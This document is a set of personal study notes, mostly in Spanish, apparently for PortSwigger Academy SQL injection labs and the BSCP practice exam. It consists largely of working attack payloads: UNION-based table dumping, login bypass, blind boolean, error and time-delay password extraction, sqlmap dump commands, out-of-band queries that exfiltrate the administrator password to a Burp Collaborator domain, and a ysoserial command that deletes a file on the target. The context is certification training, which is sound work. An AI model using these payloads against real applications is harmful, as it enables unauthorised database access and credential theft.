
Esta vulnerabilidad la redacté y creé escuchando: 

> Ateo - Granuja `Album: Selecion Natural`

Y con ayuda de algunos tips y consejos extras del repo de @botesjuan

Pendiente: Reforzar al maximo llevando al limite mis capaciades intelectuales para exprimirle el jugo a SQLMap

---
## SQL Injection

> Error based or Blind SQL injection vulnerabilities, allow SQL queries in an application to be used to extract data or login credentials from the database. SQLMAP is used to fast track the exploit and retrieve the sensitive information.

> _**Identify**_ SQLi, by adding a double (") or single quote (') to web parameters or tracking cookies, if this break the SQL syntax resulting in error message response, then positive SQL injection _**identified**_. If no error or conditional message observed test blind [Time delays](https://portswigger.net/web-security/sql-injection/cheat-sheet) payloads.

[SQL Injection cheat sheet examples](https://portswigger.net/web-security/sql-injection/cheat-sheet)

La mayoria de puntos vulns a SQLi partirán por aqui: 

![](Pasted%20image%2020250222194225.png)

![](Pasted%20image%2020250222233559.png)


### LAB: SQLi UNION recuperando datos de otras tablas `?category=`

* Es un ataque simple para recuperar los datos de otras tablas simplemente llamando a users table y sus columns, username and password.
```js
?category='UNION+SELECT+NULL,NULL+FROM+users-- //podemos probar NULL's a ver como nos va. 
//PAYLOAD FINAL ->
?category='UNION+SELECT+username,password+FROM+users--
```


### LAB: Bypass inicio de session `admin credentials`

Por defecto debajo del inicio de sesion corre una consulta SQL de la sig manera: 

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

Y lo podemos bypassear de la manera: 

* Username: `administrator'--`
* Password: `' AND password = ''`
 
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

![](Pasted%20image%2020250223115340.png)

---
### LAB: Blind SQL Time Delay Recuperando informacion `trackingId`

> Blind SQL injection with time delays is tricky to _**identify**_, fuzzing involves educated guessing as OffSec also taught me in OSCP. The below payload will perform conditional case to delay the response by 10 seconds if positive SQL injection _**identified**_.

> Identify SQLi vulnerability. In [Burp Practice exam Stage 2](https://portswigger.net/web-security/certification/takepracticeexam/index.html) the advance search filters are vulnerable to `PostgreSQL`. I found `SQLMAP` tricky to identify and exploit the practice exam vulnerability in advance search. Manual exploit of the SQL injection time delay in [Practice Exam here](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#practice-exam-postgresql-timedelay).

```sql
;SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE pg_sleep(0) END--
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

> [URL encoded](https://www.urlencoder.org/) `PostgreSQL` payload.

```sql
'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END--
```

> Determine how many characters are in the password of the administrator user. To do this, increment the number after `>1` conditional check.

```sql
;SELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

`TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
```

![](Pasted%20image%2020250222195327.png)

> Using CLUSTER Bomb attack to re-run the attack for each permutation of the character positions in the password, and to determine character value.

```sql
;SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

> Using CLUSTER bomb attack type with two payload, first for the length of the password `1..20` and then second using characters `a..z` and numbers `0..9`. Add the **Response Received** column los primeros 20 characters , to the intruder attack results to sort by and observe the `10` seconds or more delay as positive response, y vamos tomando los numeros ordenados de 1-20 y organizandolo con su respectivo caracter. 

### Practice Exam PostgreSQL TimeDelay `/..?SearchTerm=x&sort-by=SQLi`

> In the Burp Practice exam stage 2 the SQL injection is escaped not using single quote `'` but using a semicolon `;` and then URL encoding it as `%3B`.

```sql
; = %3B
%3BSELECT+pg_sleep(7)--
```

![](Pasted%20image%2020250222201559.png)

> With a Intruder CLUSTER bomb attack the password can be extracted in one single attack with two payload positions in the below payload.

Claramente en intruder filtraremos por el **response received los que tengan 7 seg serán las letras de la password**

```sql
;SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END+FROM+users--
```

> Stage 3 of the Burp Practice exam admin portal require exploitation of an [insecure deserialization](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#ysoserial) cookie value.

```js
- In Java versions 16 and above:

java -jar ysoserial-all.jar \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \ --add-opens=java.base/java.net=ALL-UNNAMED \ --add-opens=java.base/java.util=ALL-UNNAMED \ CommonsCollections4 'rm /home/carlos/morale.txt' | base64
    
- In Java versions 15 and below:
    
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```

--- 
### Blind SQLi `TrackingId` Out-of-band data exfiltration `XXE`

> Target is vulnerable to Out of band data exfiltration using Blind SQL exploitation query. In this case the trackingID cookie. Below is combination of SQL injection and XXE payload to exploit the vulnerability and send administrator password as DNS request to the collaborator service

Importante añadir el Burp-Collaborator para poder exfiltrar la info. 

```js
TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.OASTIFY.COM/">+%25remote%3b]>'),'/l')+FROM+dual--

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

![](Pasted%20image%2020250222202602.png)

En burp-collab: **password**.dominioCOLLAB.oastify.com
![](Pasted%20image%2020250222203157.png)

### LAB: Blind SQL injection with conditional errors `exfiltrate password admin`

* https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

> The SQL payload above can also be used to extract the Administrator password

```js
1. TrackingId=xyz'
2. TrackingId=xyz''
3. TrackingId=xyz'||(SELECT '')||'
4. TrackingId=xyz'||(SELECT '' FROM dual)||'
5. TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
6. TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
7. TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
8. TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
9. TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
10. TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
11. TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
12. TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
And so on. You can do this manually using burpRepeater, since the length is likely to be short. When the condition stops being true (i.e. when the error disappears), you have determined the length of the password, which is in fact 20 characters long.
1. Con intruder un payload de a-z-0-9: 
2. TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
3. TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
4. TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,3,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
5. ... seguimos cambiando el (password,4,1) hasta completar la length de la password.
Lo podriamos automatizar con un Clusterbomb y 1st payload: 0-9 2nd payload:a-z-0-9 y filtramos por response received los primeros 20 posiciones de menor a mayor filtrando por CODIGO 500 STATUS  ------>
1. TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,§4§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

![](Pasted%20image%2020250222205416.png)
### LAB: Blind SQL injection with out-of-band interaction `XXE` `trackingId`

> Placing a single quote at end of the `trackingid` cookie or search parameter `/search_advanced?searchTerm='` may give response `500 Internal Server Error`. Make an educated guess, by using below blind SQLi payload and combine with basic XXE technique, this then makes a call to collaboration server but **no data is ex-filtrated**.

```sql
TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//OASTIFY.COM/">+%25remote%3b]>'),'/l')+FROM+dual--
```

![](Pasted%20image%2020250222210030.png)

> Additional SQLi payload with XML for reference with `||` the SQL concatenation operator to concatenate two expressions that evaluate two character data types or to numeric data type and do some obfuscating.

```js
'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % fuzz SYSTEM "http://OASTI'||'FY.COM/">%fuzz;]>'),'/l') from dual)||'
```

### LAB: Blind SQLi Conditional Response `trackingId` `Welcome back!`

> This blind SQL injection is _**identified**_ by a small message difference in the responses. When sending a valid true SQL query the response contain `Welcome back` string in response. Invalid false SQL query statement do not contain the response conditional message.

```js
TrackingId=xyz' AND '1'='1
```

> False SQL statement to _**identify**_ conditional message not in response.

```js
TrackingId=xyz' AND '1'='2
```

![](Pasted%20image%2020250222213056.png)

> Determine how many characters are in the password of the administrator user. To do this, change the SQL statement value to and in intruder **Settings tab**, at the "**Grep - Match**" section. Clear any existing entries in the list, and then add the value **`Welcome back`** to _**identify**_ true condition.

```js
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

> Next step is to test the character at each position to determine its value. This involves a much larger number of requests.

```js
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
```

![](Pasted%20image%2020250222211828.png)

> Alternative use a **CLUSTER Bomb** attack and setting **two** payload positions, first one for the character position with a payload of numbers **`1..20`** and the second position, using **a-z-0-9** alfanumericos, this will iterate through each permutation of payload combinations. y claro grepeamos por "Welcome back" y tomo el resultado de los primeros 20 resultados que se grepeen por el `Welcome back`

![](Pasted%20image%2020250222212019.png)

### LAB: Listing content database in Oracle DB `admin password` `?category=`

> Identified SQL injection by adding a **single quote** to the end of the `category` parameter value and observing response of `500 Internal Server Error`.

Claro los nombres de la tabla y de las columnas password y username las vamos consiguiendo secuencialmente en cada comando SQL.

> Retrieve the list of tables in the Oracle database:

```sql
?category=Pets'+UNION+SELECT+table_name,NULL+FROM+all_tables--
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

> Oracle payload to retrieve the details of the columns in the table.

```sql
?category=Pets'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XXXX'--

'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XXX'--
```

> Oracle payload to retrieve the usernames and passwords from Users_XXX table.

```js
//Payload
'+UNION+SELECT+USERNAME_XXX,+PASSWORD_XXX+FROM+USERS_XXX--


//Solo fue una vez que lo resolví y quedo así:
?category=Pets'+UNION+SELECT+USERNAME_YBTTBZ,+PASSWORD_FWZOIF+FROM+USERS_DEOYJF--
//Pero las tablas se atualizan siempre los nombres. lo mismo las columnas. 
```

### SQLMAP Exam BSCP Practice `filtered_search?SearchTerm=`

De este comando, cosas como authority, cookie y las demas son y se deben actualizar ya que son valores propios del lab o examen. OBVIO

> In the [PortSwigger Practice Exam APP](https://portswigger.net/web-security/certification/takepracticeexam/index.html) we _**identify**_ SQLi on the advance search function by adding a single quote and the response result in `HTTP/2 500 Internal Server Error`.

> After doing some testing with SQLMAP versions `1.7.2#stable` and `1.6`, I found that both are able to exploit the PortSwigger Practice exam. Walkthrough from [bmdyy doing the Practice Exam using SQLMAP](https://youtu.be/yC0F05oggTE?t=563) for reference of the parameters used.

[PortSwigger Forum thread - SQLMAP](https://forum.portswigger.net/thread/stage-2-of-practice-exam-with-sqlmap-1-7-2-2078f927)

> I took the practice exam and was able to exploit SQLi using below payload.

```js
sqlmap -u 'https://TARGET.net/filtered_search?SearchTerm=x&sort-by=DATE&writer=' \ 
  -H 'authority: 0afd007004402dacc1e7220100750051.web-security-academy.net' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: _lab=YesYesYesYes; session=YesYesYesYes' \
  -H 'referer: https://TARGET.net/filtered_search?SearchTerm=x&sort-by=DATE&writer=' \
  -H 'sec-ch-ua: "Chromium";v="111", "Not(A:Brand";v="8"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Linux"' \
  -H 'sec-fetch-dest: document' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-user: ?1' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36' \
  -p 'sort-by' -batch --flush-session --dbms postgresql --technique E --level 5
```
![](Pasted%20image%2020250222220158.png)
```js
sqlmap -v -u 'https://TARGET.NET/search?term=x&organizeby=DATE&journalist=&cachebust=1656138093.57' -p "term" --batch --cookie="_lab=YESYESYESYES; session=YESYESYESYES" --random-agent --level=2 --risk=2
```

![](Pasted%20image%2020250222220231.png)

[SQLMAP Help usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

> SQLMAP DBS to get databases.

-p le dice a sqlmap que `sort-by` es el comando a testear de la url

```js
sqlmap -u "https://vulnerable-site.com/products?sort-by=price" \
-p "sort-by" -batch --dbms=PostgreSQL --technique=E --level=5 --dbs


-p 'sort-by' -batch --dbms postgresql --technique E --level 5 --dbs
```

> Use SQLMAP dump tables identified from `public` database.

```js
sqlmap -u "https://vulnerable-site.com/products?sort-by=price" \ -p "sort-by" -batch --dbms=PostgreSQL --technique=E --level=5 \ -D public --tables

-p 'sort-by' -batch --dbms postgresql --technique E --level 5 -D public --tables
```

> ContinueUse SQLMAP `E` Technique to get the `users` content.

```js
sqlmap -u "https://vulnerable-site.com/products?sort-by=price" \
-p "sort-by" -batch --dbms=PostgreSQL --technique=E --level=5 \
-D public -T users --dump


-p 'sort-by' -batch --dbms postgresql --technique E --level 5 -D public -T users --dump
```

### LAB: Listing content database in Non-Oracle Manual SQLi `?category=` `admin password`

> SQL injection UNION attack, determining the **number of columns** returned by the query.

Por ejm las consultas malas retornan 500 error server, como está: 
`?category=Pets'+UNION+SELECT+NULL,NULL,NULL,NULL,NULL,NULL--` ahora uno va ajustando quitando o añadiendo nulls segun cual retorné 200 oK, en este caso fue ese: 

```sql
'+UNION+SELECT+NULL,NULL--
```

> Determined there is **two** columns returned. Finding a column containing `text`, to be used for reflecting information extracted.

```sql
'+UNION+SELECT+'fuzzer',NULL--
```

> Next _**identifying**_ a list of **tables** in the database.

```sql
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

> **OPTIONAL:** Retrieve data from other tables, use code below payload to retrieve the contents of the `users` table.

```sql
'+UNION+SELECT+username,+password+FROM+users--
```

> Retrieve the names of the **columns** in the _**users**_ table.

Aqui siempre con el comando de los info_schema.tables ese siempre mostrara una tabla que es tipo users_infoRara por ejm: `users_hrrype` solo es un ejm. 

```sql
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_XXXX'--
```

> **Final** step is to the **dump data** from the username and passwords columns.

```sql
'+UNION+SELECT+username_XXXX,+password_XXXX+FROM+users_XXXX--
```

![](Pasted%20image%2020250222222512.png)

### LAB: EXTRAER MUTLIPLES VALORES EN UNA SOLA CONSULTA DE COLUMNA: 

> **EXTRA:** If you only have one column to extract text data, then concatenate multiple values in a single reflected output field using SQL syntax `||` characters from the database.

```js
//LO ESENCIAL ES PRIMERO DEFINIR LOS NULL's y saber en que posicion podemos insertar nuestra columna, ¿el primer null, el segundo null? eso toca probarlo. 
//en este caso en el segundo NULL, y además probando se llego que solo acepta 2 NULL
'+UNION+SELECT+NULL,NULL,NULL-- //tira error 500
'+UNION+SELECT+NULL,NULL-- //no tira error -> sabemos que son 2 NULL
'+UNION+SELECT+NULL,NULL+FROM+users--
//PAYLOAD FINAL ->
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

![](Pasted%20image%2020250222220929.png)

### LAB: Visible error-based SQL injection `TrackingId` 

Adding a single quote to the end of the `TrackingId` cookie value, we can _**identify**_ and confirm the SQL Injection based on the message in the response.

```js
TrackingId=VALUE-trackingId'
//Pero para el ataque dejamos la cookie con el valor de x
//TrackingId=x'ATTACK
```


![](Pasted%20image%2020250222223025.png)

> The two payloads validate administrator record is the first record, and then to retrieve the password for the Administrator account from the `user` table in the database, from the columns `username` and `password`.

```js
//Este nos retorna el username (administrator) ya que filtramos el limite al primero 1
TrackingId=x'AND 1=CAST((SELECT username FROM users LIMIT 1)AS int)--
//Con ello en mente ya solo mejoramos la busqueda no para user sino para password.
TrackingId=x'||CAST((SELECT password FROM users LIMIT 1) AS int)--;
```

> Due to the cookie value length limit the payload is shortened by using `limit 1`, and the actual cookie value replace with just a letter `x`. SQL Injection used the [CAST function](https://portswigger.net/web-security/sql-injection/blind).

![](Pasted%20image%2020250222223137.png)

Claro la contraseña varia, se actualiza siempre, no es esa. 

### LAB: SQLi + Bypass validation with XML Encoding `admin credentials` `storeId`

* En este ataque tan simple como usar hackvertor para encoding hexadecimal y usaremos el payload que antes hemos visto de consulta de varias columnas en una sola consulta de columna, con `||'~'||` 

```js
<storeId>
	1 UNION SELECT username ||'~'|| password FROM users--
</storeId>
//Pero antes de ello encodeado a hexadecimal -> con hackvertor extension.
<@hex_entities>
	1 UNION SELECT username ||'~'|| password FROM users--
</@hex_entities>
```

![](Pasted%20image%2020250223135204.png)

![](Pasted%20image%2020250223135155.png)


### LAB: calcular numero de columnas con `NULL's` `?category=`

* Basicamente tiramos un UNION con NULL's y hasta donde no nos de error internal server, entonces ahí ya sabemos el numero de columnas.

```js
'+UNION+SELECT+NULL,NULL,NULL-- 
//y asi sucesivamente lleno de null's hasta ver donde no retorna error, ahi es.
```

### LAB: Búsqueda de una columna que contiene texto con `NULL's` `?category=`

* Basicamente determinamos el numero de columnas con la tecnica de los NULL's de arriba y luego de ello vamos iterando por cada columna cual acepta `string 'a'

```js
+UNION+SELECT+NULL--
'+UNION+SELECT+NULL,NULL--
'+UNION+SELECT+NULL,NULL,NULL--
'+UNION+SELECT+NULL,NULL,NULL,NULL--
#Esto lo hacemos hasta que ya no nos aparezca un error de server
#y podamos determinar el #columnas. identificamos un total de 3 columns
------------------------
vamos iterando el 'a' en cada column
'+UNION+SELECT+'a',NULL,NULL--
'+UNION+SELECT+NULL,'a',NULL--
'+UNION+SELECT+NULL,NULL,'a'-- 
#Esto con el fin de determinar que columna es compatible con el tipo de dato cadena. 
```
### LAB: Blind SQLi con retrasos de tiempo `trackingId`

* Simplemente conseguir un retraso de tiempo. 
```sql
'dbms_pipe.receive_message(('a'),10)--
'AND (dbms_pipe.receive_message(('a'),10))--
'||(dbms_pipe.receive_message(('a'),10))--

'WAITFOR DELAY '0:0:10'--
'||WAITFOR DELAY '0:0:10'--

'SELECT pg_sleep(10)--
'||SELECT pg_sleep(10)--

'SELECT SLEEP(10)--

//payload FINAL -->
TrackingId=x'||pg_sleep(10)--
```

---
---
# PAYLOADS By @KrakenEu

Payloads:

```js
' order by 10-- -

' union select group_concat(schema_name) from information_schema.schemata-- -

' union select group_concat(table_name) from information_schema.tables where table_schema='nombre'-- -

' union select group_concat(column_name) from information_schema.columns where table_name='nombre'-- -

' union select group_concat(user,pass) from db.table'-- -

' UNION SELECT username_bvwtof || '~' || password_qbbxtg,'KEH' FROM users_tbmogf-- -
```

PortSwigger cheat sheet: [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

Oracle :

```
Identufy Oracle:
'||(SELECT '')||' -> error
'||(SELECT '' FROM dual)||' -> valid
 
UNION SELECT NULL,NULL FROM dual-- (because dual is a table we knoe in oracle)

'+UNION+SELECT+table_name,NULL+FROM+all_tables--

'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--

'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--

sqlmap -u 'https://0a6d00360460e7dd8187719900d200c5.web-security-academy.net/filter?category=Tech+gifts' -p category --sql-query "SELECT USERNAME_LASZLI, PASSWORD_GLJIEZ FROM PETER.USERS_NYXISJ"
```

SQLMAP options

```
magia =  sqlmap -u "https://<exam-url>/searchadvanced?searchTerm=1*&organizeby=DATE&blog_artist=" --
cookie="_lab=<change-me>; session=<change-me>" --batch --risk 3 --level 5 --dbms=postgresql --dbs

sqlmap -u '' --cookie='' --random-agent -p order --level 5 --risk 1 --batch --dbms='postgresql'



-u url (to get database type)
--dbs (to get database name)
-D 'x' --tables (to get table names)
-D 'x' -T 'y' --columns (to get column names)
--sql-query "SELECT 'z' FROM 'y':'x' WHERE..."


Cookies:
sqlmap -u 'https://0a1f00dd030c941881478ad000eb009a.web-security-academy.net/' --cookie='TrackingId=WKeIOdvGpLvJVfLQ; session=cmJ9qZmmemaKrj2qg5qFXZOFVNF3D8eo' -p TrackingId --level 2 
```

Conditional Responses test:

```
Welcome message appears if rows are returned:

TrackingId=Wh80UOwUs6kA9B53'AND+1=2--+- (Welcome Back message disappears)
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
Check passw length:
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
Brute force password:
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
...
You can also cluster bomb it
```

Conditional error test:

```
' -> error
'' -> no error
'||(SELECT '')||' -> error
'||(SELECT '' FROM dual)||' -> no error (Oracle)
'||(SELECT '' FROM not-a-real-table)||' -> error
Check if a database exists (users in this case):
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'

Test if you can controll errors, if the condition is true, show error:
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' -> error
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' -> no error

test if user administrator exists:
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' -> error recieved, therefore there is a user administrator

password length:
'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

password brute force cluster bomb first number and a-z:
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

```

Visible errors tests:

```
Use CAST to check a query against a boolean:

' -> error with SQL query displayed
'-- -> no error
' AND CAST((SELECT 1) AS int)-- -> AND must be boolean
' AND 1=CAST((SELECT 1) AS int)-- -> no error
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- -> username administrator displayed
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- -> password for admin displayed
```

Postgre blind: blinds:[https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1](https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1)

```
'||pg_sleep(10)--
';SELECT pg_sleep(5);--
Time delays, use sqlmap or CASE:
'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
cluster bomb
```

Out Of Band Blind **(Union select ...)** REQUIERED UNIOOOOOOOOOOOON!

```
 Oracle 	

(XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual

The following technique works on fully patched Oracle installations, but requires elevated privileges:
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
Microsoft 	exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
PostgreSQL 	copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
MySQL 	

The following techniques work on Windows only:
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'

```

DNS lookup with data exfiltration

```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
Microsoft 	declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
PostgreSQL 	create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
MySQL 	The following technique works on Windows only:
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```

XML encoding SQL Injection Extension = Hackvertor Try in diferent entities of the body

```
UNION SELECT NULL -> attack detected

xml encoding via hex entity of hackvertor extension
<@hex_entities>UNION SELECT NULL<@/hex_entities>
<@hex_entities>UNION SELECT schema_name FROM information_schema.schemata<@/hex_entities>
<@hex_entities>UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'<@/hex_entities>
<@hex_entities>UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'<@/hex_entities>
<@hex_entities>UNION SELECT password FROM public.users WHERE username='administrator'<@/hex_entities></storeId>
```

SACA EL WIJI XELI

```
'-- -
''
' SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--+-
' UNION SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--+-
'; SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--+-
' UNION SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END--+-
'; SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END--+-
' AND 1 = (SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE NULL END)--+-
' OR 1 = (SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE NULL END)--+-
'; OR 1 = (SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE NULL END)--+-
'; AND 1 = (SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE NULL END)--+-
' SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a')
' UNION SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a')
'; SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a')

' SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--+-
' UNION SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--+-
'; SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--+-
' UNION SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END--+-
'; SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END--+-
' AND 1 = (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)--+-
' OR 1 = (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)--+-
'; OR 1 = (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)--+-
'; AND 1 = (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)--+-
' SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a')
' UNION SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a')
'; SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a')
' dbms_pipe.receive_message(('a'),20)--+-
' OR dbms_pipe.receive_message(('a'),20)--+-
' AND dbms_pipe.receive_message(('a'),20)--+-
